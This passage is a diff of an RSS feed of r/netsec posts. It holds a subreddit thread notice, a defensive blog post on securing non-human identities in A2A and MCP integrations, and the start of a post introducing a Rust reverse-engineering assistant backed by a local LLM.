@@ -1,149 +1,831 @@
-<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://news.securenza.be</link><description></description><item><title>r/netsec monthly discussion &amp; tool thread</title><link>https://www.reddit.com/r/netsec/comments/1jzrx4g/rnetsec_monthly_discussion_tool_thread/</link><author>/u/albinowax</author><category>netsec</category><pubDate>Tue, 15 Apr 2025 13:29:45 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Questions regarding netsec and discussion related directly to netsec are welcome here, as is sharing tool links.Always maintain civil discourse. Be awesome to one another - moderator intervention will occur if necessary.Avoid NSFW content unless absolutely necessary. If used, mark it as being NSFW. If left unmarked, the comment will be removed entirely.If linking to classified content, mark it as such. If left unmarked, the comment will be removed entirely.Avoid use of memes. If you have something to say, say it with real words.All discussions and questions should directly relate to netsec.No tech support is to be requested or provided on r/netsec.As always, the content & discussion guidelines should also be observed on r/netsec.Feedback and suggestions are welcome, but don't post it here. Please send it to the moderator inbox.]]></content:encoded></item><item><title>They’re Everywhere! Why Non-Human Identities (and Their Security) Should Be Your Top Priority – Ben DH Kim</title><link>https://bendh.kim/2025/04/15/theyre-everywhere-why-non-human-identities-and-their-security-should-be-your-top-priority/</link><author>/u/Opposite-Antelope-27</author><category>netsec</category><pubDate>Tue, 15 Apr 2025 10:58:31 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Hey everyone, let’s talk about something that’s quietly taking over our digital world: Non-Human Identities (NHIs). You might not think about them much, but trust me, they’re everywhere, and how we handle them – especially with all the Application-to-Application (A2A) chatter and Machine Communication Platforms (MCPs) popping up – is becoming a massive deal for security.Think about it: automation, cloud services, AI… all these amazing tools rely on something to talk to each other, right? That ‘something’ often has a digital identity – an NHI. But here’s the catch: while these NHIs make things run smoothly, they can also open up huge security holes if we’re not careful.In this post, I want to break down what NHIs are, why things like A2A and MCPs can make the risks worse, and most importantly, how we can actually use these same technologies to build a strong defense.So, What Exactly Are These “Non-Human Identities”?Getting to Know the MachinesFirst off, what is a Non-Human Identity (NHI)? Simply put, it’s a digital ID for anything that isn’t a person using your systems. Think machines, apps, automated scripts, services, or devices. While your login is tied to you, an NHI lets these non-human actors get things done – accessing resources, moving data, running automated tasks.You’ve probably encountered NHIs without realizing it:API Keys: Giving apps permission to talk to each other.OAuth Tokens: Another way apps get secure access.Service Accounts: Special accounts for apps or background processes.System/Application Accounts: Similar accounts for system-level tasks.Machine IDs: Unique identifiers for servers, virtual machines, containers, or even those smart IoT gadgets.Digital Certificates (like SSL/TLS): Used to prove identity and encrypt communication.Secrets: Passwords, encryption keys, and other sensitive bits needed for access.We can even group these into categories like workload IDs (for things like Kubernetes), API IDs, or device IDs (like for your smart thermostat).One huge difference from human logins? Most NHIs can’t use Multi-Factor Authentication (MFA). Humans get that extra layer of security, but NHIs often rely on static “secrets” like API keys or certificates. If that secret gets out, there’s often no second chance – the attacker is in.Why NHIs Are Suddenly Everywhere (and Super Important)The rise of automation, cloud computing, AI, microservices, DevOps, and the Internet of Things (IoT) has made NHIs absolutely essential. They’re the engine driving efficiency and scalability in modern businesses.Think about all the things NHIs enable:Running scheduled jobs automatically.Backing up critical data without anyone lifting a finger.Powering CI/CD pipelines for building and deploying software.Making Robotic Process Automation (RPA) possible.Connecting different apps and services so they can share data (A2A/M2M communication). API keys let programs access cloud resources, and service accounts automate tasks within cloud platforms.Managing cloud services, securing communication between microservices, enabling containers and VMs to interact, and authenticating countless IoT devices.Using digital certificates to create secure, encrypted connections.Basically, NHIs are the invisible workforce making modern IT tick. How well we manage and secure them directly impacts how efficiently and safely our businesses run.Humans vs. Machines: Why NHI Security is TrickyNHIs aren’t just digital humans; they have unique characteristics that make securing them a whole different ballgame. There are WAY more NHIs than human users – often 10x to 100x more! Managing that sheer volume is tough. Plus, unlike human accounts often managed centrally (like in HR systems), NHIs pop up everywhere – different clouds, SaaS tools, on-prem systems – created by various teams. This decentralization makes it hard to see everything, apply consistent rules, and keep control. The tech trends driving NHI growth (cloud, microservices) mean our old human-focused security methods just can’t keep up. NHIs aren’t tied to a person, so ownership can be murky. Who’s responsible for creating, using, and deleting them? Often, nobody knows for sure. Sometimes multiple apps or admins share one NHI, making tracking access a nightmare. Developers often create NHIs on the fly, sometimes without thinking through the security implications or giving them way too much power. As mentioned, MFA is usually off the table for NHIs. They rely on static credentials (keys, tokens, certificates, passwords). If those leak, it’s game over. The decentralized nature makes protecting these static secrets even harder. Security can’t just be the IT team’s job; it needs to be built-in from the start (“Shift Left”).Weird Lifecycles & Behavior: NHIs don’t log in and out like people. Some live for seconds (like cloud workloads), others for years (hello, ancient service account!). Their automated actions can be hard to predict or track, and often lack detailed audit trails or context.These differences make NHIs harder to manage and more vulnerable than human accounts. With critical systems and AI relying more heavily on them, NHI security isn’t just a tech issue – it’s a major business risk. We need specialized tools and strategies designed for NHIs.Untangling A2A and MCPs: How Machines TalkOkay, so NHIs need to communicate. Two terms you’ll hear a lot are A2A (Application-to-Application) integration and MCPs (Machine Communication Platforms). Let’s clarify what they are.A2A Integration: The Classic ConnectionThink of traditional A2A integration as the way different software within an organization talks directly, sharing data without someone manually typing it in. It’s about connecting systems like your CRM, ERP, and HR software so information flows smoothly. It can even help pull data from old legacy systems into newer ones.The main goal? Make business processes smoother and automated. It allows real-time data sharing, reduces errors from manual entry, and boosts efficiency. Often, it involves exchanging transaction data like sales orders or inventory updates.Typically, this happens through middleware platforms (like iPaaS) that translate between different application formats and protocols. Asynchronous messaging (where systems don’t have to wait for each other) is common, often using web services like SOAP or REST. Security involves encryption and authentication, maybe using digital signatures or specific features within Privileged Access Management (PAM) tools. Usually, this communication happens within a trusted zone, like behind the company firewall.MCPs: Giving AI a Voice (Anthropic’s Take)Now, Machine Communication Platforms (MCPs), especially the one Anthropic open-sourced, are a bit different. MCP is designed specifically to standardize how AI models (like LLMs) talk to the outside world. Instead of building custom connections every time an AI needs data or needs to use a tool, MCP provides a common language.The goal is a universal standard for AI models to connect safely and scalably with data stores, business tools, APIs, etc. This lets AI go beyond its training data, access real-time info, and use specialized tools to give much better, context-aware answers. Think of it like a “universal remote” or “USB-C for AI”, enabling plug-and-play integration.It usually follows a client-server model:MCP Host: The AI app using the LLM (e.g., your IDE).MCP Client: Lives in the host app, manages connections to MCP servers.MCP Server: A lightweight program exposing specific functions (like file access, DB queries, API calls) via the MCP protocol.Communication uses JSON-RPC 2.0 messages, often over standard input/output locally or HTTP/SSE remotely. It’s two-way, so the AI can also trigger actions. Servers offer resources (data), prompts (templates), and tools (functions).Use cases include developers checking database status from their IDE or AI coding assistants getting context from documentation via an MCP server. It has potential for business tasks like customer support or marketing too.Security-wise, MCP intends to protect data, but the current spec lacks standardized authentication between clients and servers, or clear ways to handle credentials for third-party APIs. Its built-in permission model is also quite basic.Spotting the Difference: A2A vs. AI ProtocolsSo, traditional A2A, Anthropic’s MCP, and even Google’s A2A (which focuses on AI agents talking to each other) all involve machine communication, but they have different goals:Traditional A2A: Internal systems sharing structured business data.Anthropic’s MCP: AI models connecting to external tools/data for context (Vertical Integration).Google’s A2A: AI agents collaborating with other AI agents (Horizontal Integration). Agents use “Agent Cards” to discover each other’s capabilities.For this post, we’re mainly focusing on traditional A2A and Anthropic’s MCP. But the rise of agent-to-agent communication adds another layer of complexity to NHI security.Crucially, all these forms of machine communication rely heavily on NHIs (API keys, tokens, certificates, etc.). If the NHI security is weak, the communication channel built on it is also weak. It’s all connected. While A2A established the need for secure machine comms, the modern landscape of APIs and AI makes the challenge much bigger and more complex.How A2A/MCP Can Accidentally Make NHI Risks WORSEOkay, A2A and MCPs sound useful, right? They boost automation and efficiency. But here’s the scary part: if you don’t manage them properly, they can seriously amplify existing NHI security risks. Think ID sprawl, exposed credentials, and configuration nightmares – all leading to potential breaches.Feeding the Beast: Identity SprawlMore A2A connections and MCP integrations mean more NHIs. Every new API link, microservice interaction, or cloud service connection needs its own API key, service account, token, or certificate. Without clear rules for creating, tracking, managing, and deleting these NHIs, things get messy fast.In environments like the cloud or DevOps pipelines, it’s super easy to spin up new NHIs. But often, there’s no central management or clear ownership. What happens when a project ends or someone leaves? Those NHIs might just hang around – unused but still active. We call these “orphaned” or “zombie” IDs. Developers creating NHIs on the fly without proper oversight adds to the problem.This uncontrolled spread is ID Sprawl. It massively increases your attack surface. Every forgotten NHI is a potential backdoor for attackers. They love finding these less-monitored IDs to get their initial foothold.Danger Zone: Exposed Credentials in TransitSetting up A2A/MCP requires using NHI credentials (API keys, tokens, private keys, passwords). If managed poorly, these secrets are prime targets for exposure.A classic mistake? Hardcoding secrets directly into source code, config files, or deployment scripts. These can accidentally end up in public code repositories (like GitHub), get shared in forums, show up in CI/CD logs, or be stored insecurely in plain text files or spreadsheets. Sending them over unencrypted channels is another big no-no.Why is this so bad? Remember, most NHIs don’t have MFA. Once a credential leaks, attackers can often just walk right in, pretending to be that legitimate NHI.With stolen credentials, attackers can steal sensitive data, perform unauthorized actions, and move laterally through your network to cause even more damage. Leaked API keys and certificates are major culprits in breaches. The push for automation combined with a lack of easy-to-use secret management tools makes risky practices like hardcoding far too common. Secure credential management needs to be part of the development process from day one.Lost in the Maze: Complexity, Misconfigurations, and Blind SpotsAs your A2A network or MCP ecosystem grows, the sheer number of NHIs and their connections becomes incredibly complex. This complexity breeds misconfigurations and makes it nearly impossible to keep a consistent eye on everything.Think about all the moving parts: countless microservices, different protocols, dynamic cloud resources, hybrid/multi-cloud setups, and NHI management spread across different teams.In this chaos, mistakes happen:Giving too much power: Violating the Principle of Least Privilege (POLP) by granting NHIs more permissions than they need is super common. Like giving write access when only read is needed.Leaving unnecessary ports/services open.Cloud resource configuration errors.Incorrect access control lists (ACLs) or firewall rules.Using old, unpatched software.This complexity also creates oversight gaps. Tracking every NHI action across all systems is a massive challenge. Logs are scattered, and different teams might apply different security rules. Verizon found misconfigurations cause over 20% of breaches – it’s a huge problem.These errors and blind spots give attackers easy ways in, cause unexpected downtime, and lead to compliance failures and fines. Remember the Capital One breach? That was partly due to an API misconfiguration. It’s a vicious cycle: ID sprawl increases complexity, which increases the chance of misconfigurations like over-privileging, making leaked credentials even more dangerous.New Protocols, New Problems: MCP’s Own RisksNewer protocols like Anthropic’s MCP are still evolving, which means they might have their own built-in vulnerabilities or configuration pitfalls. Standardizing AI-to-external-system communication is complex and can introduce new risks.A key issue is the lack of standardized authentication and authorization. MCP doesn’t clearly define how clients and servers should authenticate each other, or how an MCP server should securely handle credentials when talking to third-party APIs on a user’s behalf. This means security can vary wildly depending on how it’s implemented. The permission model is also quite basic, potentially leading to loose access control.Multi-tenancy (where multiple users share the same service) is another challenge. MCP doesn’t yet offer clear guidelines for handling separate authentication and permissions for different tenants.The complexity of the MCP architecture itself (host, client, server, transport layers) also creates opportunities for configuration errors.And then there are protocols like Google’s A2A for agent-to-agent communication. These raise new questions about data security when agents share info, how to verify agent trustworthiness, ensuring transparency and ethics, and the technical hurdles of integration. Since agents might act on a user’s behalf, securing their credentials and limiting their permissions is critical. Experts predict AI agent abuse will be a growing source of breaches.The bottom line: new A2A/MCP protocols bring unique risks due to their novelty, complexity, and the introduction of AI agents. Organizations need to be aware of these. The inherent weaknesses of NHI security (no MFA, sprawl, credential exposure) make them prime targets. Attackers often prefer simply logging in with stolen NHI credentials rather than complex hacking, highlighting just how critical NHI security is in these interconnected environments.Flipping the Script: Using A2A/MCP for Better NHI SecurityOkay, we’ve seen how A2A and MCP can make NHI risks scarier if managed poorly. But here’s the good news: when designed and implemented with strong security practices, these same technologies can become powerful tools for defending against NHI threats. It’s a double-edged sword.Secure A2A/MCP setups can provide:Centralized Control & Visibility: A single place to see and manage all those scattered NHIs.Automated Lifecycle Management: Automatically handle NHI creation, rotation, and deletion, reducing risk and effort.Secure Communication Channels: Lock down the pathways NHIs use to talk.Granular Access Control: Enforce the “need-to-know” principle (Least Privilege).Auditing & Monitoring: Keep a close eye on what NHIs are doing.Getting Organized: Centralized Management and VisibilityYou can’t protect what you can’t see. The first step is getting a handle on all the NHIs floating around your organization and managing them centrally. Good Machine Identity Management (MIM) solutions or well-designed A2A/MCP frameworks are key here. These systems use automated tools to find every NHI (API keys, service accounts, certificates, etc.) across your entire infrastructure (on-prem, cloud, SaaS) and create a constantly updated list. This tackles ID sprawl and finds those forgotten “zombie” IDs. A central dashboard gives you a single pane of glass to see and control all your NHIs. No more flying blind. It’s not enough to just list NHIs. You need to know why it exists, who owns it, what permissions it has, and what apps it’s tied to. This context allows for smarter risk assessment and better access policies.Consistent Policy Enforcement: Define your security rules (encryption standards, credential rules, access policies) in one place and automatically apply them to all relevant NHIs. This ensures consistency and reduces the risk of gaps or errors that happen when policies are managed decentrally.Putting it on Autopilot: Automated Credential Lifecycle ManagementManually managing the lifecycle of thousands of NHI credentials is a recipe for disaster. Automation is essential. This covers everything from creation to deletion.Automated Provisioning/Issuance: Quickly and securely create new NHIs and credentials (especially certificates) according to your policies, avoiding manual errors.Automated Rotation/Renewal: This is HUGE. Automatically changing API keys, passwords, and certificates regularly (or when they’re about to expire) drastically shrinks the window an attacker has if a credential leaks. Using short-lived certificates that renew automatically is a great way to ditch risky long-lived secrets.Automated Revocation/Decommissioning: When an NHI is no longer needed or poses a risk, automatically disable or remove it and its credentials quickly and reliably. This cleans up orphaned IDs and prevents risks from improper offboarding.The benefits? Efficiency and fewer errors (managing thousands manually is impossible and error-prone), and stronger security (less risk from expired or stolen credentials). In today’s dynamic environments, automation isn’t optional; it’s mandatory. Manual approaches just can’t scale.Locking Down the Lines: Secure Communication ChannelsBeyond managing the NHIs themselves, we need to secure the communication channels they use. This means ensuring data confidentiality and integrity, and building trust between communicating parties.Encrypt Everything in Transit: Use proven protocols like TLS/SSL to encrypt all data exchanged during A2A and MCP communication. This stops eavesdroppers and prevents data leaks. Tools like API gateways or service meshes can enforce the use of encrypted connections (like HTTPS). You might even encrypt the message content itself or add digital signatures for end-to-end security.Strong Mutual Authentication: Make sure both ends of the communication prove they are who they say they are. Go beyond simple API keys or passwords:
-Mutual TLS (mTLS): Both client and server exchange and verify each other’s digital certificates. This is great at stopping Man-in-the-Middle (MITM) and spoofing attacks.OAuth 2.0 / OpenID Connect (OIDC): Standard protocols for delegating access securely. They use temporary access tokens, often via flows like Client Credentials Grant specifically designed for M2M communication, avoiding direct credential exposure. Just because an NHI is authenticated doesn’t mean it should access everything. Verify what it’s allowed to do. Use concepts like OAuth scopes to grant only the minimum necessary permissions. Always choose secure versions of protocols – HTTPS over HTTP, SSH over Telnet, etc.Layering these techniques builds robust security for your communication channels.Need-to-Know Basis: Enforcing Granular Access Control (Least Privilege)A core principle for securing NHIs is the Principle of Least Privilege (POLP). This means any identity (human or not) should only have the absolute minimum permissions needed to do its specific job.Why is this critical for NHIs? They often need access to important stuff. If an over-privileged NHI gets compromised, the damage can be massive. Applying POLP limits what an attacker can do even if they do compromise an NHI.How to implement POLP effectively:Grant Minimal Permissions: When creating an NHI, define exactly what it needs to do (e.g., call this specific API, read that database table) and grant only those permissions. Remove unused permissions immediately.Role-Based Access Control (RBAC): Define roles (e.g., “backup agent”) and assign the necessary permissions to the role, then assign the role to the NHI. This is more organized than assigning permissions individually.Attribute/Policy-Based Access Control (ABAC/PBAC): Make access decisions dynamically based on attributes of the NHI, the resource, and the context (time, location, etc.).Limit Scopes: When using protocols like OAuth, carefully define the scope of the access token to restrict what the NHI can do.Regular Access Reviews: Periodically check if the permissions granted to NHIs are still appropriate and necessary. Roles change, and permissions can creep up over time.Applying granular access control consistently helps slash risks from excessive permissions and aligns with Zero Trust principles.Keeping Watch: Comprehensive Auditing and MonitoringYou need to know what your NHIs are up to. Centralized management and automation enable comprehensive auditing and real-time monitoring. This helps you spot weird behavior or potential threats early, respond quickly, and meet compliance requirements. Log everything important an NHI does – login attempts, credential requests, API calls, resource access, data changes. Logs should include who (NHI ID), what, when, where, and the outcome. Collect these logs centrally. Analyze logs and real-time activity to spot threats or policy violations. Set up baselines of normal NHI behavior and trigger alerts when deviations (anomalies) occur. Look for red flags: accessing unusual systems, downloading huge amounts of data, sudden spikes in failed logins, attempts to escalate privileges, access from suspicious IPs, activity at odd hours. AI and Machine Learning tools can help sift through the noise and find real threats. Detailed logs and monitoring data are essential for meeting regulations like PCI-DSS, GDPR, NIST standards, etc., which often require activity logging and review.Auditing and monitoring are non-negotiable. They improve threat detection and response, provide accountability, and help prove compliance. When combined with centralized management and automation, they significantly boost your NHI security posture. This proactive approach is far better than just reacting after a breach.Tech Deep Dive: Tools to Tame the NHI BeastLet’s get a bit more technical. What specific tools and mechanisms can help us mitigate NHI risks in A2A/MCP environments?mTLS: The Two-Way HandshakeMutual TLS (mTLS) is like a secret handshake for machines. Unlike regular TLS where only the server proves its identity, with mTLS, both the client and the server show their credentials (digital certificates) and verify each other before starting to talk. This is super effective for M2M communication.Here’s the gist of the handshake: Client connects -> Server shows certificate -> Client verifies -> Client shows certificate -> Server verifies -> Secure connection established. Both sides need valid certificates from a trusted Certificate Authority (CA) and the corresponding private keys.Why is mTLS awesome for NHI security?Stops Man-in-the-Middle Attacks: Attackers can’t jump in the middle because they don’t have valid certificates for both sides.Prevents Spoofing: Faking an identity is nearly impossible without the correct certificate and private key.Neutralizes Credential Theft: Even if an API key or password leaks, the attacker still needs the certificate and key to connect. Makes credential stuffing and brute-force attacks much harder.Reduces Phishing Impact: Stolen user credentials aren’t enough if mTLS is required.Secures APIs: Ensures only authenticated applications can make API calls.mTLS is particularly great for securing communication between microservices or IoT devices where there’s no human logging in. It relies on Public Key Infrastructure (PKI), and automating certificate lifecycle management (CLM) is crucial for making it work smoothly. It fits perfectly with the Zero Trust philosophy of verifying everything. You can often enforce mTLS using API gateways or service meshes.OAuth/OIDC: Delegating Access SecurelyOAuth 2.0 and OpenID Connect (OIDC) are the go-to standards for managing access permissions, especially when one application (an NHI) needs to access resources on another service (like an API).The core idea is to grant access without sharing the user’s (or machine’s) actual password. It uses temporary “Access Tokens”. The client app gets a token from an Authorization Server and presents it to the Resource Server to get access.For M2M scenarios where no human is involved, OAuth offers specific flows:Client Credentials Grant: The client app uses its own ID and secret (or a JWT) to get an access token directly from the authorization server. Perfect for M2M.JWT Bearer Flow: The client uses an existing JWT it holds as proof to get an access token.Benefits of using OAuth/OIDC for M2M:No Direct Credential Sharing: Protects sensitive credentials.Scoped Access: You can limit what the access token allows the client to do (Scope), enforcing least privilege.Granular Control & Revocation: Tokens usually expire, and you can revoke specific tokens if needed.Standardization: Widely adopted standards mean better interoperability.Important Security Notes: You must protect the client credentials (ID/secret or JWT keys) themselves, often using a secrets management tool. Access tokens can still be stolen, so keep their lifetimes short and secure the communication channel (e.g., with mTLS). Always grant the minimum necessary scope, and make sure the resource server thoroughly validates incoming tokens. Be wary of malicious OAuth app registrations designed to trick users.OAuth/OIDC often works hand-in-hand with Identity Providers (IdPs), API gateways, and service meshes to form the backbone of NHI access control.API Gateways: The Central Security CheckpointAn API Gateway acts like a bouncer or front desk for your backend API services. In A2A/MCP scenarios, it’s a crucial central point for enforcing security policies.How API Gateways boost NHI security:Centralized Authentication & Authorization: Instead of each backend service handling security, the gateway does it. It can check API keys, validate JWTs, process OAuth tokens, or perform mTLS handshakes. Once authenticated, it checks if the NHI is authorized for the specific request based on roles or scopes.Traffic Cop: Controls the flow of requests using rate limiting and throttling to prevent services from being overwhelmed, accidentally or maliciously (DoS/DDoS protection).Threat Shield: Acts as a first line of defense against common web attacks like SQL injection or XSS by validating incoming requests. Some offer DDoS mitigation and can add security headers to responses.Encryption Enforcement: Can force all communication to use TLS/HTTPS, protecting data in transit.Visibility & Auditing: Logs all API traffic, providing valuable data for monitoring, troubleshooting, security analysis, and compliance.In MCP environments, gateways can play a similar central role, managing authentication, authorization, traffic, and routing requests to the correct MCP servers, especially useful in multi-tenant setups.In short, API gateways simplify security management, reduce the load on backend services, and provide a robust, centralized control point for A2A/MCP communication.Secrets Management Solutions: Locking Down the KeysHandling NHI credentials (“secrets”) securely is fundamental. We’re talking API keys, tokens, passwords, private keys, certificates – all highly sensitive stuff. Hardcoding them or storing them insecurely is asking for trouble.Secrets Management Solutions are tools built specifically to solve this. Think HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, Google Cloud Secret Manager, CyberArk Conjur, Akeyless, etc. They provide secure storage, access control, rotation, and auditing for secrets throughout their lifecycle.Secure Central Vault: Store secrets encrypted in a hardened, central location. Some use Hardware Security Modules (HSMs) for extra key protection.Granular Access Control: Define precisely who or what (which NHI) can access which secret, using policies (RBAC/ABAC) based on least privilege.Dynamic Secrets: Generate temporary, short-lived credentials on demand (e.g., database passwords, cloud keys) that expire automatically. This drastically reduces the risk of long-lived secrets being exposed.Automated Rotation: Automatically change passwords, keys, and certificates on a schedule or based on policy. Reduces manual effort and prevents rotation lapses.Detailed Audit Logs: Track every access and operation on secrets for monitoring, threat detection, and compliance.Integration: Provide APIs and libraries to easily integrate with applications, CI/CD pipelines, Kubernetes, etc., allowing systems to fetch secrets securely at runtime instead of hardcoding them. Developer-friendliness is key.These tools are essential for reducing the complexity and risk of managing NHI credentials in A2A/MCP environments.Here’s a quick comparison table focusing on NHI use cases for some popular options:Table 1: Quick Look at Some Secrets Management Tools (NHI Focus)Akeyless (Alternative Example)Very Diverse (Keys, DB Creds, Cloud Keys, Certs, etc.)DB Creds, API Keys, OAuth Tokens, other stringsKeys, Secrets (strings), CertificatesDiverse (DB Creds, Cloud Keys, API Keys, Certs, SSH Keys, etc.)Policy-based (Flexible but complex), Many auth methodsAzure RBAC (Easy in Azure)Policy-based, RBAC, Akeyless authStrong support (AWS, DB, etc.)Limited (Mainly RDS DB Creds)Broad support (AWS, Azure, GCP, DB, K8s, etc.)Supported (May need some setup)Built-in (Mainly DB Creds)Built-in (Secrets, Keys, Certs)AWS CloudTrail IntegrationAzure Monitor IntegrationIntegration (Cloud, DevOps, K8s)Strong AWS integration, limited externalStrong Azure integration, K8s supportBroad cloud, DevOps, K8s supportOpen Source (Self-hosted), Enterprise (Self-hosted), HCP (SaaS)Fully Managed SaaS (Azure)High complexity (esp. Self-hosted)High ease of use, low ops burdenOS free, Enterprise/HCP paid (Can be high)Subscription-based, claims lower TCOFlexibility, Broad Integration, Dynamic SecretsSeamless AWS integration, Managed ServiceSeamless Azure integration, Cert ManagementEase of Use, Broad Automation, SaaSComplexity, Cost, Community support for some integrationsAWS lock-in, Limited dynamic/external featuresAzure lock-in, Limited dynamic/external featuresNewer player, might lack some niche Vault featuresRemember, these tools work best together in a layered defense strategy. For example, use an API Gateway with mTLS, authorized by OAuth, with the secrets stored in Vault. But technology alone isn’t enough. You need good governance, skilled people, and continuous validation to truly secure NHIs in A2A/MCP setups. Choose tools wisely based on your specific needs and environment.Making it Happen: Strategic Steps for Secure A2A/MCPAlright, we know the risks and the tools. How do we put this into practice strategically?Weaving it Together: Integrating A2A/MCP Security into NHI and Zero TrustNHI security isn’t a silo. It must be part of your overall cybersecurity strategy, especially your Zero Trust architecture and identity governance plans. Secure A2A/MCP practices are the foundation for making this happen.Zero Trust’s mantra is “Never trust, always verify”. This applies just as much (if not more) to NHIs as it does to humans. Every access request needs continuous verification based on identity, device state, and context, with access granted based on least privilege.Secure A2A/MCP practices directly enable Zero Trust for NHIs:mTLS provides strong identity verification for machines.API Gateways and Secrets Management tools act as central points for enforcing access control and least privilege.Automated lifecycle management and monitoring allow for continuous validation and anomaly detection.So, don’t treat NHI security or A2A/MCP security as separate projects. Integrate them into your broader Zero Trust roadmap. This provides a more systematic way to manage risks, ensure consistent security, and strengthen your overall defense. Prioritize investments in secure A2A/MCP technologies and processes as part of your Zero Trust journey.Where to Start? Prioritizing Key Security ActionsTrying to do everything at once is overwhelming. Based on risk and impact, here’s a suggested priority list for securing NHIs in A2A/MCP environments:Get Visibility (Highest Priority): You MUST know what NHIs you have and how they’re used. Use discovery tools, build a central inventory, and gather context (owner, purpose, permissions). Without visibility, you’re flying blind.Lock Down Secrets (High Priority): Leaked credentials are a top threat. Implement a secrets management solution (Vault, AWS Secrets Manager, etc.). Eradicate hardcoded secrets from code and configs; make apps fetch secrets securely at runtime.Enforce Least Privilege (High Priority): Over-privileged NHIs amplify breach damage. Strictly apply POLP – grant only the minimum permissions needed for the specific task. Use RBAC/ABAC and conduct regular access reviews to trim excess permissions.Automate Lifecycle Management (Medium-High Priority): Long-lived, static credentials are risky. Automate credential rotation (especially for certificates and keys) and decommissioning. Use short-lived credentials where possible and ensure unused NHIs are promptly disabled.Use Strong Authentication & Encryption (Medium Priority): Move beyond basic API keys. Implement stronger methods like mTLS for mutual authentication. Always encrypt communication channels using TLS/HTTPS.Monitor & Audit Everything (Medium Priority): Continuous monitoring and detailed logging are crucial for detecting anomalies and investigating incidents. Set up centralized logging and use analytics (maybe AI/ML) to spot suspicious behavior.This is a general guide; tailor it to your organization’s specific risks and resources. The key is to treat NHI security as an ongoing process, not a one-off project.The Cost of Doing Nothing: Business Impacts of NHI NeglectIgnoring NHI security isn’t just a tech problem; it’s a major business risk with potentially devastating consequences. This is the big one. Stolen NHI credentials can give attackers the keys to your sensitive data kingdom (customer info, IP, financials). Breaches cost millions on average . High-profile companies like Equifax, Capital One, Tesla, CircleCI, and T-Mobile have all suffered NHI-related breaches. Expired certificates or compromised service accounts can bring critical business processes grinding to a halt. In today’s automated world, this means lost productivity, lost revenue, and unhappy customers. Many organizations report outages due to certificate issues. Regulations like GDPR, PCI-DSS, and various NIST/ISO standards have strict rules about data protection and access control. Failing to secure NHIs can lead to massive fines (GDPR fines can be up to 4% of global turnover), lawsuits, and business restrictions . Breaches and outages severely damage trust with customers, partners, and investors . Rebuilding that trust takes a long time and a lot of effort.Bottom line: NHI security is a strategic imperative for business continuity and growth. Investing in proper management and defense isn’t just about avoiding disaster; it’s about enabling secure, sustainable operations.Wrapping Up: Taming the Machine Identity MazeSo, there you have it. Non-Human Identities are powerful enablers but also significant risks, especially with the rise of A2A communication and MCPs. While poor management can amplify threats like ID sprawl and credential leaks, a proactive, security-focused approach can turn these technologies into powerful defenses.The key is visibility, automation, and integration. See your NHIs, automate their lifecycle and security checks, and weave NHI security into your broader Zero Trust strategy. Prioritize actions like locking down secrets and enforcing least privilege.It’s not just an IT task anymore; it’s a core business requirement. Ignoring NHI security is rolling the dice with your data, operations, compliance, and reputation. By embracing secure A2A/MCP practices and robust NHI management, we can navigate the complexities of the modern digital landscape safely and effectively.]]></content:encoded></item><item><title>Aiding reverse engineering with Rust and a local LLM</title><link>https://security.humanativaspa.it/aiding-reverse-engineering-with-rust-and-a-local-llm/</link><author>/u/0xdea</author><category>netsec</category><pubDate>Tue, 15 Apr 2025 04:40:44 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[“A large fraction of the flaws in software development are due to programmers not fully understanding all the possible states their code may execute in.”
-— John CarmackThere’s a new entry in my ever-growing tool suite, designed to assist with vulnerability research against binary targets: oneiromancer.It’s a reverse engineering assistant that uses a fine-tuned, locally running LLM to aid with code analysis. It can analyze a function or a smaller code snippet, returning a high-level description of what the code does, a recommended name for the function, and variable renaming suggestions based on the results of the analysis.As you’ve probably guessed, oneiromancer is written in  🦀 While working on this tool, I also contributed the new  category to crates.io. I hope you’ll find it useful for your projects.This article is the fourth installment in our Offensive Rust series. In it, I will introduce my new tool and guide you further along your journey into Rust programming. Let’s dive in!The awesome idalib Rust bindings were awarded a well-deserved third place! But another project caught my attention among the winners: aiDAPal by Atredis Partners. It’s an IDA Pro plugin that uses a  that has been fine-tuned for Hex-Rays pseudo-code to assist with code analysis.Personally, I’m not buying into the current frenzy around and large language models in general. However, I grudgingly have to recognize that there’s more to LLMs than just hype (stay tuned to this blog for some innovative developments in this field that we can’t disclose just yet). Anyway, the premise behind aiDAPal intrigued me, and therefore I decided to .Since the fine-tuned model is freely available on Hugging Face under a permissive license, I thought I could write  to query it. And in my never-ending quest to become a better Rust programmer, I decided to write it in Rust. Really fell in love with this language! I never considered myself a  to begin with (although I’ve always enjoyed coding since I started as a kid with BASIC in the 80s), and I’m definitely no evangelist. I couldn’t care less which language you use 🤷 However,  has got something that makes me really want to keep digging deeper and building stuff. But I digress…“Secret agent man, secret agent man
-They’ve given you a number
-And taken away your name”
-— Johnny Rivers, Secret Agent Man (1966)Before we look at some Rust learning resources and deep-dive into oneiromancer’s implementation, let’s uphold our tradition by recommending an appropriate  for your hacking delight! 🕵🏻‍♂️Here are some  that I recently discovered:If you’re still struggling with starting your first Rust project, even after perusing the extensive list of learning resources that I’ve shared here and in my past articles, I have a final recommendation for you: The Secrets of Rust: Tools. It’s a recent  that will guide you through the process of designing command-line tools in Rust, step by step. If you’re stuck, you might want to give it a try.Querying the OneiromancerSomeone who divines through the interpretation of dreams.Oneiromancer is a reverse engineering assistant that uses a  that has been fine-tuned for Hex-Rays decompiler’s pseudo-code, to . It can analyze a function or a smaller code snippet, returning a high-level description of what the code does, a recommended name for the function, and variable renaming suggestions based on the results of the analysis. Its main  are:Cross-platform support for the aidapal based on .Easy integration with my haruspex and popular IDEs.Code , recommended , and variable  are printed to the terminal. of each analyzed function is saved in a separate file for easy inspection.External crates can invoke  or  to analyze pseudo-code and then process analysis results.Additional information on oneiromancer’s features and usage is available at crates.io and in the official documentation.Let’s  it and take it for a spin! The easiest way to get the latest release is via crates.io:$ cargo install oneiromancer
-Before you can use it, however, you must download and install ollama. Then, download the fine-tuned weights and the Ollama modelfile from Hugging Face:$ wget https://huggingface.co/AverageBusinessUser/aidapal/resolve/main/aidapal-8k.Q4_K_M.gguf 
